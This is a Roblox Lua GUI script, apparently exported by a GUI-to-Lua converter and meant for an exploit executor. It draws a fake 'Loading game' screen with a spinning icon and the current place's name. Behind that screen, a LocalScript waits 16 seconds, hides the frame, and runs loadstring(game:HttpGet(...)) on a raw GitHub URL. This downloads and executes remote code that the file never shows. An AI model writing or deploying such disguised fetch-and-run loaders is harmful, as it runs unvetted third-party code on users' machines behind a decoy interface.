--[=[
 d888b  db    db d888888b      .d888b.      db      db    db  .d8b.  
88' Y8b 88    88   `88'        VP  `8D      88      88    88 d8' `8b 
88      88    88    88            odD'      88      88    88 88ooo88 
88  ooo 88    88    88          .88'        88      88    88 88~~~88 
88. ~8~ 88b  d88   .88.        j88.         88booo. 88b  d88 88   88 
 Y888P  ~Y8888P' Y888888P      888888D      Y88888P ~Y8888P' YP   YP  CONVERTER
]=]

-- Instances: 14 | Scripts: 4 | Modules: 0
local G2L = {};

-- StarterGui.Loading
G2L["1"] = Instance.new("ScreenGui", game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui"));
G2L["1"]["Name"] = [[Loading]];
G2L["1"]["ZIndexBehavior"] = Enum.ZIndexBehavior.Sibling;

-- StarterGui.Loading.loading2
G2L["2"] = Instance.new("Frame", G2L["1"]);
G2L["2"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["2"]["BackgroundTransparency"] = 0.8500000238418579;
G2L["2"]["Size"] = UDim2.new(0, 543, 0, 333);
G2L["2"]["Position"] = UDim2.new(0.3353511095046997, 0, 0.2992788553237915, 0);
G2L["2"]["Visible"] = false;
G2L["2"]["Name"] = [[loading2]];

-- StarterGui.Loading.loading2.UICorner
G2L["3"] = Instance.new("UICorner", G2L["2"]);


-- StarterGui.Loading.loading2.TextLabel
G2L["4"] = Instance.new("TextLabel", G2L["2"]);
G2L["4"]["TextWrapped"] = true;
G2L["4"]["TextScaled"] = true;
G2L["4"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["4"]["TextSize"] = 14;
G2L["4"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["4"]["Size"] = UDim2.new(0, 200, 0, 50);
G2L["4"]["Text"] = [[Game found!]];
G2L["4"]["Font"] = Enum.Font.SourceSans;
G2L["4"]["BackgroundTransparency"] = 1;
G2L["4"]["Position"] = UDim2.new(0.31491711735725403, 0, 0.04204203933477402, 0);

-- StarterGui.Loading.loading2.GameName
G2L["5"] = Instance.new("TextLabel", G2L["2"]);
G2L["5"]["TextWrapped"] = true;
G2L["5"]["TextScaled"] = true;
G2L["5"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["5"]["TextSize"] = 14;
G2L["5"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["5"]["Size"] = UDim2.new(0, 371, 0, 65);
G2L["5"]["Text"] = [[Loading game]];
G2L["5"]["Name"] = [[GameName]];
G2L["5"]["Font"] = Enum.Font.SourceSans;
G2L["5"]["BackgroundTransparency"] = 0.550000011920929;
G2L["5"]["Position"] = UDim2.new(0.15837936103343964, 0, 0.402402400970459, 0);

-- StarterGui.Loading.loading2.GameName.UICorner
G2L["6"] = Instance.new("UICorner", G2L["5"]);


-- StarterGui.Loading.loading2.Game
G2L["7"] = Instance.new("LocalScript", G2L["2"]);
G2L["7"]["Name"] = [[Game]];

-- StarterGui.Loading.loading2.seconds
G2L["8"] = Instance.new("TextLabel", G2L["2"]);
G2L["8"]["TextWrapped"] = true;
G2L["8"]["TextScaled"] = true;
G2L["8"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["8"]["TextSize"] = 14;
G2L["8"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["8"]["Size"] = UDim2.new(0, 203, 0, 38);
G2L["8"]["Text"] = [[wait time around 5 seconds]];
G2L["8"]["Name"] = [[seconds]];
G2L["8"]["Font"] = Enum.Font.SourceSans;
G2L["8"]["BackgroundTransparency"] = 1;
G2L["8"]["Position"] = UDim2.new(0, 0, 0.8858858942985535, 0);

-- StarterGui.Loading.loading1
G2L["9"] = Instance.new("Frame", G2L["1"]);
G2L["9"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["9"]["BackgroundTransparency"] = 0.8500000238418579;
G2L["9"]["Size"] = UDim2.new(0, 424, 0, 100);
G2L["9"]["Position"] = UDim2.new(0.37162086367607117, 0, 0.4399038553237915, 0);
G2L["9"]["Name"] = [[loading1]];

-- StarterGui.Loading.loading1.ImageLabel
G2L["a"] = Instance.new("ImageLabel", G2L["9"]);
G2L["a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["a"]["Image"] = [[http://www.roblox.com/asset/?id=6021874488]];
G2L["a"]["Size"] = UDim2.new(0, 100, 0, 100);
G2L["a"]["Rotation"] = 4;
G2L["a"]["BackgroundTransparency"] = 1;

-- StarterGui.Loading.loading1.ImageLabel.LocalScript
G2L["b"] = Instance.new("LocalScript", G2L["a"]);


-- StarterGui.Loading.loading1.TextLabel
G2L["c"] = Instance.new("TextLabel", G2L["9"]);
G2L["c"]["TextWrapped"] = true;
G2L["c"]["TextScaled"] = true;
G2L["c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["c"]["TextSize"] = 14;
G2L["c"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["c"]["Size"] = UDim2.new(0, 257, 0, 50);
G2L["c"]["Text"] = [[Loading]];
G2L["c"]["Font"] = Enum.Font.SourceSans;
G2L["c"]["BackgroundTransparency"] = 1;
G2L["c"]["Position"] = UDim2.new(0.3066037595272064, 0, 0.25, 0);

-- StarterGui.Loading.loading1.TextLabel.LocalScript
G2L["d"] = Instance.new("LocalScript", G2L["c"]);


-- StarterGui.Loading.loading1.LocalScript
G2L["e"] = Instance.new("LocalScript", G2L["9"]);


-- StarterGui.Loading.loading2.Game
local function C_7()
local script = G2L["7"];
	local GameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
	
	local frame = script.Parent.Parent.loading2
	local main = script.Parent.Parent.TopFrame
	
	script.Parent.GameName.Text = "Loading "..GameName
	
	
	
	wait(16)
	frame.Visible = false
	
	if frame.Visible == false then
		loadstring(game:HttpGet("https://raw.githubusercontent.com/doran08/Script65/main/load.lua", true))()
	end
end;
task.spawn(C_7);
-- StarterGui.Loading.loading1.ImageLabel.LocalScript
local function C_b()
local script = G2L["b"];
	local visible = true
	
	if script.Parent.Parent.Parent.loading1.Visible == false then
		visible = false
	end
	
	while visible == true do
		wait()
		script.Parent.Rotation += 5
	end
	
	
	
	
end;
task.spawn(C_b);
-- StarterGui.Loading.loading1.TextLabel.LocalScript
local function C_d()
local script = G2L["d"];
	local label = script.Parent
	
	while true do
		label.Text = "loading."
		wait(1)
		label.Text = "loading.."
		wait(1)
		label.Text = "loading..."
		wait(1)
	end
end;
task.spawn(C_d);
-- StarterGui.Loading.loading1.LocalScript
local function C_e()
local script = G2L["e"];
	local frame = script.Parent
	local frame2 = script.Parent.Parent.loading2
		
	wait(10)
	
	frame.Visible = false
	
	frame2.Visible = true
	
end;
task.spawn(C_e);

return G2L["1"], require;
